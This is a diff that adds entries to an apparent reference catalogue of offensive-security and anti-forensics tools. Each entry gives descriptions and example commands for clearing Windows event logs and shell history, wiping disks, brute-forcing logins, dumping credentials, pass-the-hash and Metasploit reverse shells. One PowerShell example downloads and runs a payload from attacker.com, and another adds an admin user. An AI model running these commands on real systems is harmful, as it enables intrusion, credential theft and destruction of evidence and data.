+        docs: "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol",
+        image: "../assets/img/auditpol.png",
+        usage:
+          "Auditpol can be used to view, enable, disable, or clear audit policies on a Windows system. After exploitation, attackers may use it to disable logging or erase traces of malicious activity.",
+        examples: [
+          "Clear audit policy settings:\n  auditpol /clear /y",
+          "View current audit policy:\n  auditpol /get /category:*",
+          "Disable all auditing:\n  auditpol /set /category:* /success:disable /failure:disable",
+          'Enable logon event auditing:\n  auditpol /set /subcategory:"Logon" /success:enable /failure:enable',
+          "List subcategories for detailed control:\n  auditpol /list /subcategory:*",
+        ],
+        parameters: [
+          {
+            param: "/get /category:*",
+            description: "Display current audit policies for all categories",
+          },
+          {
+            param: "/set",
+            description:
+              "Set audit policy for a specific category or subcategory",
+          },
+          { param: "/clear", description: "Clear all audit policy settings" },
+          {
+            param: "/list /subcategory:*",
+            description: "List all available audit subcategories",
+          },
+          {
+            param: "/success /failure",
+            description: "Configure success/failure auditing",
+          },
+        ],
+      },
+      wevtutil: {
+        name: "Wevtutil",
+        command: "wevtutil cl Security",
+        description:
+          "Wevtutil is a Windows command-line utility used to query, export, archive, and clear event logs. It’s commonly used by attackers and administrators to manage or wipe event traces for forensic evasion or system maintenance.",
+        category: "Anti-Forensics / Clearing Tracks",
+        version: "Windows Built-in",
+        docs: "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil",
+        image: "../assets/img/wevtutil.png",
+        usage:
+          "Wevtutil allows you to manipulate Windows Event Logs. Attackers often use it to clear specific logs (e.g., Security, Application) to hide traces of exploitation or privilege escalation activities.",
+        examples: [
+          "Clear the Security log:\n  wevtutil cl Security",
+          "Clear the Application log:\n  wevtutil cl Application",
+          "Clear the System log:\n  wevtutil cl System",
+          "Export a log to file:\n  wevtutil epl Security security.evtx",
+          "Query event log info:\n  wevtutil gli Security",
+        ],
+        parameters: [
+          {
+            param: "cl",
+            description: "Clear the specified log (e.g., cl Security)",
+          },
+          { param: "epl", description: "Export the specified log to a file" },
+          { param: "gli", description: "Get log information" },
+          { param: "enum-logs", description: "List all available logs" },
+          {
+            param: "enum-publishers",
+            description: "List event log publishers",
+          },
+        ],
+      },
+      logcleaner: {
+        name: "LogCleaner",
+        command: "python3 logcleaner.py --target /var/log/auth.log",
+        description:
+          "LogCleaner is a script/tool used to remove or alter entries in log files to hide unauthorized activity. It’s typically used after gaining access to prevent detection during forensic analysis.",
+        category: "Anti-Forensics / Log Tampering",
+        version: "1.0",
+        docs: "https://github.com/D4Vinci/LogCleaner",
+        image: "../assets/img/logcleaner.png",
+        usage:
+          "LogCleaner is used to clean or modify log files on Linux systems. It can remove lines matching specific patterns like IPs, usernames, or actions to erase traces of an intrusion.",
+        examples: [
+          "Clean SSH logs:\n  python3 logcleaner.py --target /var/log/auth.log",
+          "Remove entries by IP:\n  python3 logcleaner.py --target /var/log/auth.log --pattern '192.168.1.10'",
+          "Remove entries by username:\n  python3 logcleaner.py --target /var/log/auth.log --pattern 'root'",
+          "Preview matches before cleaning:\n  python3 logcleaner.py --target /var/log/auth.log --pattern 'ssh' --dry-run",
+          "Clean all logs recursively:\n  python3 logcleaner.py --target /var/log --recursive",
+        ],
+        parameters: [
+          {
+            param: "--target",
+            description: "Path to the log file or directory",
+          },
+          {
+            param: "--pattern",
+            description: "Regex or keyword pattern to remove",
+          },
+          {
+            param: "--dry-run",
+            description: "Preview changes without deleting anything",
+          },
+          {
+            param: "--recursive",
+            description: "Clean logs inside directories recursively",
+          },
+          { param: "--help", description: "Show usage information" },
+        ],
+      },
+      historyeraser: {
+        name: "History Eraser",
+        command: "history -c && unset HISTFILE",
+        description:
+          "History Eraser refers to techniques used to clear or disable shell history on Linux systems. This is commonly used by attackers to remove traces of commands executed during post-exploitation.",
+        category: "Anti-Forensics / Clearing Tracks",
+        version: "Shell Built-in",
+        docs: "https://www.gnu.org/software/bash/manual/html_node/Bash-History.html",
+        image: "../assets/img/historyeraser.png",
+        usage:
+          "Clearing shell history helps attackers avoid detection by system administrators and forensic analysts. This is often done after executing sensitive commands on compromised systems.",
+        examples: [
+          "Clear current session history:\n  history -c",
+          "Disable history logging for current session:\n  unset HISTFILE",
+          "Clear history and overwrite file:\n  > ~/.bash_history && history -c",
+          "Prevent future logging:\n  export HISTFILE=/dev/null",
+          "Use with sudo to affect root history:\n  sudo bash -c 'history -c && unset HISTFILE'",
+        ],
+        parameters: [
+          {
+            param: "history -c",
+            description: "Clear the in-memory shell history",
+          },
+          {
+            param: "unset HISTFILE",
+            description: "Prevent shell from writing to history file",
+          },
+          {
+            param: "export HISTFILE=/dev/null",
+            description: "Redirect history to null device",
+          },
+          {
+            param: "> ~/.bash_history",
+            description: "Empty the history file",
+          },
+          {
+            param: "sudo bash -c",
+            description: "Apply history clearing as root user",
+          },
+        ],
+      },
+      covermyass: {
+        name: "CoverMyAss (CMA)",
+        command: "./cma.sh",
+        description:
+          "CoverMyAss (CMA) is a bash script designed to automate anti-forensics techniques on Unix-based systems. It hides evidence of intrusion by clearing logs, deleting history files, and masking user actions.",
+        category: "Anti-Forensics / Automation",
+        version: "1.0",
+        docs: "https://github.com/bash-cma/CoverMyAss",
+        image: "../assets/img/cma.png",
+        usage:
+          "CMA is used to automate post-exploitation cleanup tasks on Linux systems. It removes various shell history files, clears system logs, and alters timestamps to help intruders remain undetected.",
+        examples: [
+          "Run CMA script:\n  ./cma.sh",
+          "Suppress all output while running:\n  ./cma.sh > /dev/null 2>&1",
+          "Make CMA executable:\n  chmod +x cma.sh\n  ./cma.sh",
+          "Run with elevated permissions:\n  sudo ./cma.sh",
+          "View or edit script behavior:\n  nano cma.sh",
+        ],
+        parameters: [
+          {
+            param: "chmod +x cma.sh",
+            description: "Make the script executable",
+          },
+          { param: "./cma.sh", description: "Execute the script" },
+          {
+            param: "> /dev/null 2>&1",
+            description: "Suppress terminal output and errors",
+          },
+          {
+            param: "sudo",
+            description: "Run with root privileges to access all logs",
+          },
+          {
+            param: "nano cma.sh",
+            description: "Modify the script to customize what is erased",
+          },
+        ],
+      },
+      shred: {
+        name: "Shred",
+        command: "shred -n 3 -z -u file.txt",
+        description:
+          "Shred is a command-line utility on Unix/Linux systems used to securely delete files by overwriting their contents multiple times, making recovery difficult or impossible.",
+        category: "Anti-Forensics / File Destruction",
+        version: "GNU Coreutils",
+        docs: "https://man7.org/linux/man-pages/man1/shred.1.html",
+        image: "../assets/img/shred.png",
+        usage:
+          "Shred is used to overwrite files with random data before deleting them, which prevents file recovery tools from restoring the original content. It is a common anti-forensics tool for covering tracks after file manipulation.",
+        examples: [
+          "Securely delete a file with 3 passes:\n  shred -n 3 -z -u file.txt",
+          "Overwrite a file without deleting it:\n  shred -n 5 file.txt",
+          "Shred a device or partition:\n  shred -v /dev/sdX",
+          "Use with wildcards (careful!):\n  shred -u *.log",
+          "Hide shredding process output:\n  shred -f -s 10M file.txt > /dev/null",
+        ],
+        parameters: [
+          { param: "-n", description: "Specify number of overwrite passes" },
+          {
+            param: "-z",
+            description: "Add a final overwrite with zeros to hide shredding",
+          },
+          { param: "-u", description: "Remove file after overwriting" },
+          { param: "-v", description: "Verbose mode" },
+          {
+            param: "-f",
+            description:
+              "Force change permissions to allow writing if needed",
+          },
+        ],
+      },
+      srm: {
+        name: "Secure-delete (srm)",
+        command: "srm -vz file.txt",
+        description:
+          "Secure-delete’s `srm` command is used to securely delete files by overwriting their contents using the Gutmann method or DOD-compliant patterns, making data recovery nearly impossible.",
+        category: "Anti-Forensics / File Destruction",
+        version: "3.1",
+        docs: "https://linux.die.net/man/1/srm",
+        image: "../assets/img/srm.png",
+        usage:
+          "`srm` is a secure file deletion tool that overwrites files before deleting them, ensuring the data cannot be recovered even with advanced forensic tools. It is part of the Secure-delete suite used in Unix-like systems.",
+        examples: [
+          "Securely delete a file:\n  srm file.txt",
+          "Verbose mode (show progress):\n  srm -v file.txt",
+          "Use zero overwrite on final pass:\n  srm -vz file.txt",
+          "Overwrite and delete a directory:\n  srm -r /path/to/dir",
+          "Use DOD 5220.22-M method (default):\n  srm -d file.txt",
+        ],
+        parameters: [
+          {
+            param: "-v",
+            description: "Verbose mode; show detailed progress",
+          },
+          { param: "-z", description: "Zero out on the final overwrite" },
+          { param: "-r", description: "Recursively delete directories" },
+          {
+            param: "-d",
+            description: "DOD 5220.22-M compliant deletion (default)",
+          },
+          {
+            param: "--force",
+            description: "Ignore warnings for write-protected files",
+          },
+        ],
+      },
+      bleachbit: {
+        name: "BleachBit (CLI)",
+        command: "bleachbit --clean system.tmp system.cache",
+        description:
+          "BleachBit is a system cleaning and privacy protection tool. The command-line interface (CLI) version allows users to automate cleaning of temporary files, logs, cache, and more to remove traces of system activity.",
+        category: "System Cleaner / Anti-Forensics",
+        version: "4.6.0",
+        docs: "https://www.bleachbit.org/documentation/command-line-usage",
+        image: "../assets/img/bleachbit.png",
+        usage:
+          "BleachBit (CLI) is used to clean system junk, browser history, cache, and logs to protect privacy or reduce forensic footprints. It supports automated scripting, making it ideal for post-exploitation cleanup.",
+        examples: [
+          "List all cleaners:\n  bleachbit --list",
+          "Preview what will be deleted:\n  bleachbit --preview system.tmp system.cache",
+          "Clean system temp and cache:\n  bleachbit --clean system.tmp system.cache",
+          "Wipe free disk space:\n  bleachbit --wipe-free-space /",
+          "Shred specific file:\n  bleachbit --shred /path/to/file.txt",
+        ],
+        parameters: [
+          { param: "--list", description: "List all available cleaners" },
+          {
+            param: "--clean",
+            description: "Clean specified areas (e.g., system.cache)",
+          },
+          {
+            param: "--preview",
+            description: "Show what would be deleted without deleting",
+          },
+          {
+            param: "--wipe-free-space",
+            description: "Securely wipe unused disk space",
+          },
+          { param: "--shred", description: "Shred a file beyond recovery" },
+        ],
+      },
+      logwiper: {
+        name: "LogWiper",
+        command: "python3 logwiper.py --file /var/log/auth.log",
+        description:
+          "LogWiper is a Python-based anti-forensics tool designed to selectively remove or wipe log entries from Linux log files such as auth.log, syslog, and others. It helps attackers erase their traces after system access.",
+        category: "Anti-Forensics / Log Tampering",
+        version: "1.2",
+        docs: "https://github.com/example/logwiper", // Replace with actual if available
+        image: "../assets/img/logwiper.png",
+        usage:
+          "LogWiper enables attackers or red teamers to search for and remove specific lines from log files by keyword, date, or regex. It is intended for manual or scripted use during post-exploitation cleanup.",
+        examples: [
+          "Delete all entries with 'sshd':\n  python3 logwiper.py --file /var/log/auth.log --pattern 'sshd'",
+          "Remove entries by IP address:\n  python3 logwiper.py --file /var/log/auth.log --pattern '192.168.1.10'",
+          "Dry run (preview only):\n  python3 logwiper.py --file /var/log/auth.log --pattern 'login' --dry-run",
+          "Clean multiple logs:\n  python3 logwiper.py --file '/var/log/*.log' --pattern 'root'",
+          "Run quietly:\n  python3 logwiper.py --file /var/log/syslog --pattern 'exploit' --quiet",
+        ],
+        parameters: [
+          {
+            param: "--file",
+            description: "Path to the log file or wildcard path",
+          },
+          {
+            param: "--pattern",
+            description:
+              "String or regex pattern to match entries for deletion",
+          },
+          {
+            param: "--dry-run",
+            description: "Preview matches without modifying the file",
+          },
+          {
+            param: "--quiet",
+            description: "Suppress output except for errors",
+          },
+          {
+            param: "--backup",
+            description: "Backup the original log before modifying",
+          },
+        ],
+      },
+      powershellscripts: {
+        name: "PowerShell Scripts",
+        command: "powershell -ExecutionPolicy Bypass -File script.ps1",
+        description:
+          "PowerShell Scripts are commonly used in penetration testing and post-exploitation to automate tasks such as enumeration, privilege escalation, credential dumping, and persistence on Windows systems.",
+        category: "Post Exploitation / Automation",
+        version: "Windows PowerShell 5.1+ / PowerShell Core",
+        docs: "https://learn.microsoft.com/en-us/powershell/",
+        image: "../assets/img/powershell.png",
+        usage:
+          "PowerShell scripts allow attackers and red teamers to execute powerful Windows tasks with elevated privileges, often using obfuscation or bypass techniques to evade detection by antivirus and EDR tools.",
+        examples: [
+          "Run a script with execution policy bypassed:\n  powershell -ExecutionPolicy Bypass -File script.ps1",
+          "Download and execute remote script:\n  powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"",
+          'Add a new admin user:\n  powershell -c "net user hacker Pass123! /add && net localgroup administrators hacker /add"',
+          "Dump credentials using Mimikatz (if loaded):\n  Invoke-Mimikatz",
+          "Check for admin rights:\n  powershell -c \"([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')\"",
+        ],
+        parameters: [
+          {
+            param: "-ExecutionPolicy Bypass",
+            description: "Bypass execution restrictions for script running",
+          },
+          { param: "-File", description: "Specify the script to run" },
+          {
+            param: "-Command / -c",
+            description: "Run a PowerShell command inline",
+          },
+          {
+            param: "IEX",
+            description:
+              "Alias for Invoke-Expression (often used in payloads)",
+          },
+          {
+            param: "Start-Process",
+            description: "Start new processes from script",
+          },
+        ],
+      },
+      dd: {
+        name: "dd (Disk Cleaner)",
+        command: "dd if=/dev/zero of=/dev/sdX bs=1M",
+        description:
+          "`dd` is a low-level Unix/Linux utility for copying and converting raw data. It is commonly used for disk wiping by overwriting storage devices with zeros or random data, making file recovery extremely difficult.",
+        category: "Anti-Forensics / Disk Wiping",
+        version: "Core Unix Utility",
+        docs: "https://man7.org/linux/man-pages/man1/dd.1.html",
+        image: "../assets/img/dd.png",
+        usage:
+          "`dd` can be used to securely wipe drives, overwrite partitions, clone disks, or write boot images. In anti-forensics, it helps remove all traces of data from a target system or device.",
+        examples: [
+          "Wipe entire drive with zeros:\n  dd if=/dev/zero of=/dev/sdX bs=1M",
+          "Wipe with random data:\n  dd if=/dev/urandom of=/dev/sdX bs=1M",
+          "Clone one drive to another:\n  dd if=/dev/sdX of=/dev/sdY bs=4M status=progress",
+          "Backup MBR (first 512 bytes):\n  dd if=/dev/sdX of=mbr_backup.img bs=512 count=1",
+          "Destroy data on a partition:\n  dd if=/dev/zero of=/dev/sdX1 bs=512 count=100000",
+        ],
+        parameters: [
+          {
+            param: "if",
+            description: "Input file (e.g., /dev/zero, /dev/urandom)",
+          },
+          {
+            param: "of",
+            description: "Output file or device (e.g., /dev/sdX)",
+          },
+          { param: "bs", description: "Block size (e.g., 1M, 512)" },
+          { param: "count", description: "Number of blocks to write" },
+          {
+            param: "status=progress",
+            description: "Display real-time write progress",
+          },
+        ],
+      },
+      logeraser: {
+        name: "LogEraser",
+        command:
+          "python3 logeraser.py --file /var/log/auth.log --keywords 'root,sshd'",
+        description:
+          "LogEraser is a Python tool designed for selectively deleting entries from log files based on keywords, timestamps, or patterns. It is used in anti-forensics to remove traces of attacker activity from Linux systems.",
+        category: "Anti-Forensics / Log Tampering",
+        version: "1.1",
+        docs: "https://github.com/example/logeraser", // Replace with real link if available
+        image: "../assets/img/logeraser.png",
+        usage:
+          "LogEraser can be used to scan system log files and remove or comment out entries matching specific patterns. It is useful for covering tracks after exploitation or privilege escalation.",
+        examples: [
+          "Remove entries with keywords:\n  python3 logeraser.py --file /var/log/auth.log --keywords 'sshd,root'",
+          "Delete lines containing an IP:\n  python3 logeraser.py --file /var/log/syslog --keywords '192.168.1.10'",
+          "Test without modifying (dry run):\n  python3 logeraser.py --file /var/log/auth.log --keywords 'sudo' --dry-run",
+          "Backup before cleaning:\n  python3 logeraser.py --file /var/log/auth.log --backup",
+          "Clean all logs in directory:\n  python3 logeraser.py --file '/var/log/*.log' --keywords 'exploit'",
+        ],
+        parameters: [
+          {
+            param: "--file",
+            description: "Path to log file or wildcard pattern",
+          },
+          {
+            param: "--keywords",
+            description: "Comma-separated keywords or phrases to remove",
+          },
+          {
+            param: "--dry-run",
+            description: "Preview deletions without modifying the file",
+          },
+          {
+            param: "--backup",
+            description: "Create a backup copy before making changes",
+          },
+          {
+            param: "--verbose",
+            description: "Show detailed output during cleanup",
+          },
+        ],
+      },
+      metasploit: {
+        name: "Metasploit Framework",
+        command:
+          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.1; set LPORT 4444; exploit'",
+        description:
+          "A penetration testing platform that enables you to find, exploit, and validate vulnerabilities.",
+        category: "Exploitation Framework",
+        version: "6.0.0",
+        docs: "https://docs.metasploit.com/",
+        image: "../assets/img/metasploit.png",
+        usage:
+          "The Metasploit Framework is an open-source platform for developing, testing, and executing exploit code against remote targets. It provides information about security vulnerabilities and aids in penetration testing and IDS signature development.",
+        examples: [
+          "Start Metasploit console:\n  msfconsole",
+          "Search for exploits:\n  search type:exploit platform:windows",
+          "Run a reverse TCP handler:\n  use exploit/multi/handler\n  set payload windows/meterpreter/reverse_tcp\n  set LHOST 192.168.1.1\n  set LPORT 4444\n  exploit",
+          "Generate a payload:\n  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o payload.exe",
+        ],
+        parameters: [
+          { param: "-q", description: "Run in quiet mode (no banner)" },
+          {
+            param: "-x",
+            description: "Execute specific commands on startup",
+          },
+          { param: "use", description: "Select a module to use" },
+          { param: "set", description: "Set a module option" },
+          { param: "exploit", description: "Run the current module" },
+        ],
+      },
+      hydra: {
+        name: "Hydra",
+        command: "hydra -l admin -P passwords.txt ssh://192.168.1.1",
+        description:
+          "A fast and flexible network login cracker that supports many protocols.",
+        category: "Password Cracking",
+        version: "9.3",
+        docs: "https://github.com/vanhauser-thc/thc-hydra",
+        image: "../assets/img/hydra.png",
+        usage:
+          "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.",
+        examples: [
+          "SSH brute force:\n  hydra -l admin -P passwords.txt ssh://192.168.1.1",
+          'HTTP form attack:\n  hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"',
+          "FTP attack with username list:\n  hydra -L usernames.txt -P passwords.txt ftp://192.168.1.1",
+          "RDP attack with specific port:\n  hydra -t 4 -V -f -l administrator -P passwords.txt rdp://192.168.1.1:3389",
+        ],
+        parameters: [
+          { param: "-l", description: "Single username to test" },
+          { param: "-L", description: "Username list file" },
+          { param: "-p", description: "Single password to test" },
+          { param: "-P", description: "Password list file" },
+          {
+            param: "-t",
+            description: "Number of parallel tasks (default: 16)",
+          },
+        ],
+      },
+      john: {
+        name: "John the Ripper",
+        command: "john --wordlist=passwords.txt --format=NT hashes.txt",
+        description:
+          "A fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.",
+        category: "Password Cracking",
+        version: "1.9.0",
+        docs: "https://www.openwall.com/john/doc/",
+        image: "../assets/img/john.png",
+        usage:
+          "John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, BeOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords. Besides several crypt(3) password hash types most commonly found on various Unix systems, supported out of the box are Windows LM hashes, various macOS password hashes, as well as database and document formats.",
+        examples: [
+          "Dictionary attack:\n  john --wordlist=passwords.txt hashes.txt",
+          "Brute force attack:\n  john --incremental hashes.txt",
+          "Show cracked passwords:\n  john --show hashes.txt",
+          "Crack Windows hashes:\n  john --format=NT hashes.txt",
+          "Crack with rules:\n  john --wordlist=passwords.txt --rules hashes.txt",
+        ],
+        parameters: [
+          {
+            param: "--wordlist",
+            description: "Wordlist file for dictionary attack",
+          },
+          {
+            param: "--format",
+            description: "Hash format (NT, md5crypt, etc.)",
+          },
+          { param: "--incremental", description: "Brute force mode" },
+          { param: "--rules", description: "Enable word mangling rules" },
+          { param: "--show", description: "Show cracked passwords" },
+        ],
+      },
+      armitage: {
+        name: "Armitage",
+        command: "armitage",
+        description:
+          "A graphical cyber attack management tool for Metasploit that visualizes targets and recommends exploits.",
+        category: "Exploitation",
+        version: "1.0",
+        docs: "http://www.fastandeasyhacking.com/",
+        image: "../assets/img/armitage.png",
+        usage:
+          "Armitage is a graphical cyber attack management tool for the Metasploit Project that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework. It is designed to help security professionals better understand hacking and to help them realize the power and potential of Metasploit.",
+        examples: [
+          "Start Armitage:\n  armitage",
+          "Connect to team server:\n  armitage --teamserver 192.168.1.1 --user msf --pass password",
+          "Start with specific port:\n  armitage --port 55553",
+          "Start in unattended mode:\n  armitage --unattended",
+        ],
+        parameters: [
+          { param: "--teamserver", description: "Connect to a team server" },
+          { param: "--user", description: "Username for team server" },
+          { param: "--pass", description: "Password for team server" },
+          { param: "--port", description: "Port to connect to" },
+          { param: "--unattended", description: "Run without GUI" },
+        ],
+      },
+      hashcat: {
+        name: "Hashcat",
+        command: "hashcat -m 1000 -a 0 hashes.txt passwords.txt",
+        description:
+          "The world's fastest and most advanced password recovery utility, supporting five unique modes of attack.",
+        category: "Password Cracking",
+        version: "6.2.5",
+        docs: "https://hashcat.net/hashcat/",
+        image: "../assets/img/hashcat.png",
+        usage:
+          "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms. Hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, Windows, and macOS, and has facilities to help enable distributed password cracking.",
+        examples: [
+          "Dictionary attack on NTLM hashes:\n  hashcat -m 1000 -a 0 hashes.txt passwords.txt",
+          "Brute force attack with mask:\n  hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a",
+          "Combinator attack:\n  hashcat -m 0 -a 1 hashes.txt words1.txt words2.txt",
+          "Hybrid attack (dict + mask):\n  hashcat -m 0 -a 6 passwords.txt ?d?d?d?d",
+          "Show cracked hashes:\n  hashcat -m 1000 --show hashes.txt",
+        ],
+        parameters: [
+          { param: "-m", description: "Hash type (1000=NTLM, 0=MD5, etc.)" },
+          {
+            param: "-a",
+            description: "Attack mode (0=straight, 3=brute, etc.)",
+          },
+          { param: "--show", description: "Show cracked hashes" },
+          { param: "-o", description: "Output file for cracked hashes" },
+          { param: "--force", description: "Ignore warnings" },
+        ],
+      },
+      beef: {
+        name: "BeEF",
+        command: "beef-xss",
+        description:
+          "The Browser Exploitation Framework that focuses on the web browser as an attack vector.",
+        category: "Web Exploitation",
+        version: "0.5.0.0",
+        docs: "https://beefproject.com/",
+        image: "../assets/img/beef.png",
+        usage:
+          "The Browser Exploitation Framework (BeEF) is a powerful professional security tool. BeEF is pioneering techniques that provide the experienced penetration tester with practical client-side attack vectors. Unlike other security frameworks, BeEF focuses on leveraging browser vulnerabilities to assess the security posture of a target.",
+        examples: [
+          "Start BeEF:\n  beef-xss",
+          "Start with custom config:\n  beef-xss -c /path/to/config.yaml",
+          "Run with debug output:\n  beef-xss -x",
+          "Specify listening interface:\n  beef-xss -b 192.168.1.1",
+        ],
+        parameters: [
+          { param: "-c", description: "Specify configuration file" },
+          { param: "-x", description: "Enable debug output" },
+          { param: "-b", description: "Bind to specific IP address" },
+          { param: "-p", description: "Specify port number" },
+          { param: "-h", description: "Show help message" },
+        ],
+      },
+      medusa: {
+        name: "Medusa",
+        command: "medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh",
+        description:
+          "A speedy, parallel, and modular login brute-forcer supporting many protocols.",
+        category: "Password Cracking",
+        version: "2.2",
+        docs: "http://foofus.net/goons/jmk/medusa/medusa.html",
+        image: "../assets/img/medusa.png",
+        usage:
+          "Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: thread-based parallel testing, flexible user input, modular design, and multiple protocols supported.",
+        examples: [
+          "SSH brute force:\n  medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh",
+          "FTP attack with user list:\n  medusa -H hosts.txt -U usernames.txt -P passwords.txt -M ftp",
+          'HTTP form attack:\n  medusa -h 192.168.1.1 -u admin -P passwords.txt -M http -m FORM:"login.php" -m FORM-DATA:"post?user=^USER^&pass=^PASS^"',
+          "RDP attack:\n  medusa -h 192.168.1.1 -u administrator -P passwords.txt -M rdp",
+        ],
+        parameters: [
+          { param: "-h", description: "Target hostname or IP" },
+          { param: "-H", description: "File containing target hosts" },
+          { param: "-u", description: "Username to test" },
+          { param: "-U", description: "File containing usernames" },
+          {
+            param: "-M",
+            description: "Module to use (ssh, ftp, http, etc.)",
+          },
+        ],
+      },
+      sqlmap: {
+        name: "SQLmap",
+        command: 'sqlmap -u "http://example.com/page.php?id=1" --dbs',
+        description:
+          "An open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.",
+        category: "Web Exploitation",
+        version: "1.6",
+        docs: "https://sqlmap.org/",
+        image: "../assets/img/sqlmap.png",
+        usage:
+          "sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.",
+        examples: [
+          'Basic SQL injection test:\n  sqlmap -u "http://example.com/page.php?id=1"',
+          'Get database names:\n  sqlmap -u "http://example.com/page.php?id=1" --dbs',
+          'Get tables from specific DB:\n  sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables',
+          'Dump table data:\n  sqlmap -u "http://example.com/page.php?id=1" -D dbname -T users --dump',
+          'OS shell access:\n  sqlmap -u "http://example.com/page.php?id=1" --os-shell',
+        ],
+        parameters: [
+          { param: "-u", description: "Target URL" },
+          { param: "--dbs", description: "Enumerate databases" },
+          { param: "-D", description: "Database to enumerate" },
+          { param: "--tables", description: "Enumerate tables" },
+          {
+            param: "--os-shell",
+            description: "Prompt for an interactive OS shell",
+          },
+        ],
+      },
+      wce: {
+        name: "Windows Credential Editor",
+        command: "wce -w",
+        description:
+          "A security tool to list logon sessions and add, change, list, and delete associated credentials.",
+        category: "Post-Exploitation",
+        version: "1.42",
+        docs: "https://www.ampliasecurity.com/research/windows-credentials-editor/",
+        image: "../assets/img/wce.png",
+        usage:
+          "Windows Credentials Editor (WCE) is a security tool that allows users to list Windows logon sessions and add, change, list, and delete associated credentials (e.g., LM/NT hashes, plaintext passwords, and Kerberos tickets). It works similarly to gsecdump but supports more features and is more stable.",
+        examples: [
+          "Dump hashes:\n  wce -w",
+          "Dump plaintext passwords:\n  wce -p",
+          "Inject hashes:\n  wce -s username:domain:lmhash:nthash",
+          "Unset credentials:\n  wce -c",
+          "List logon sessions:\n  wce -l",
+        ],
+        parameters: [
+          { param: "-w", description: "Dump NT/LM hashes" },
+          { param: "-p", description: "Dump plaintext passwords" },
+          { param: "-s", description: "Set credentials" },
+          { param: "-c", description: "Clear credentials" },
+          { param: "-l", description: "List logon sessions" },
+        ],
+      },
+      crackmapexec: {
+        name: "CrackMapExec",
+        command: "crackmapexec smb 192.168.1.0/24 -u admin -p password",
+        description:
+          "A swiss army knife for pentesting Windows/Active Directory environments.",
+        category: "Post-Exploitation",
+        version: "5.3.0",
+        docs: "https://github.com/byt3bl33d3r/CrackMapExec",
+        image: "../assets/img/cme.png",
+        usage:
+          "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of 'Living off the Land': abusing built-in Active Directory features/protocols to achieve its functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.",
+        examples: [
+          "SMB enumeration:\n  crackmapexec smb 192.168.1.0/24",
+          "Pass-the-hash attack:\n  crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH",
+          'Execute command:\n  crackmapexec smb 192.168.1.1 -u admin -p password -x "whoami"',
+          "Dump SAM:\n  crackmapexec smb 192.168.1.1 -u admin -p password --sam",
+          "Spider shares for files:\n  crackmapexec smb 192.168.1.1 -u admin -p password --spider shares --pattern .*password.*",
+        ],
+        parameters: [
+          { param: "smb/winrm/ldap/mssql", description: "Protocol to use" },
+          { param: "-u", description: "Username" },
+          { param: "-p", description: "Password" },
+          { param: "-H", description: "NTLM hash" },
+          { param: "-x", description: "Execute command" },
+        ],
+      },
+      responder: {
+        name: "Responder",
+        command: "python Responder.py -I eth0",
+        description:
+          "A LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server.",
+        category: "Network Exploitation",
+        version: "3.0.3",
+        docs: "https://github.com/lgandx/Responder",
+        image: "../assets/img/responder.png",
+        usage:
+          "Responder is a LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answer to File Server Service request, which is for SMB.",
+        examples: [
+          "Basic poisoning:\n  python Responder.py -I eth0",
+          "Analyze mode (no poisoning):\n  python Responder.py -I eth0 -A",
+          "Enable WPAD rogue proxy:\n  python Responder.py -I eth0 -w",
+          "Fingerprint hosts:\n  python Responder.py -I eth0 -f",
+          "Specify challenge:\n  python Responder.py -I eth0 -t 1122334455667788",
+        ],
+        parameters: [
+          { param: "-I", description: "Network interface to use" },
+          { param: "-A", description: "Analyze mode (no poisoning)" },
+          { param: "-w", description: "Enable WPAD rogue proxy" },
+          { param: "-f", description: "Fingerprint hosts" },
+          { param: "-t", description: "Specify NTLM challenge" },
+        ],
+      },
+      ncrack: {
+        name: "Ncrack",
+        command: "ncrack -U usernames.txt -P passwords.txt ssh://192.168.1.1",
+        description:
+          "A high-speed network authentication cracking tool built to help companies secure their networks.",
+        category: "Password Cracking",
+        version: "0.7",
+        docs: "https://nmap.org/ncrack/",
+        image: "../assets/img/ncrack.png",
+        usage:
+          "Ncrack is a high-speed network authentication cracking tool. It was built to help companies secure their networks by proactively testing all their hosts and networking devices for poor passwords. Security professionals also rely on Ncrack when auditing their clients. Ncrack was designed using a modular approach, a command-line syntax similar to Nmap's, and a dynamic engine that can adapt its behavior based on network feedback.",
+        examples: [
+          "SSH brute force:\n  ncrack -U usernames.txt -P passwords.txt ssh://192.168.1.1",
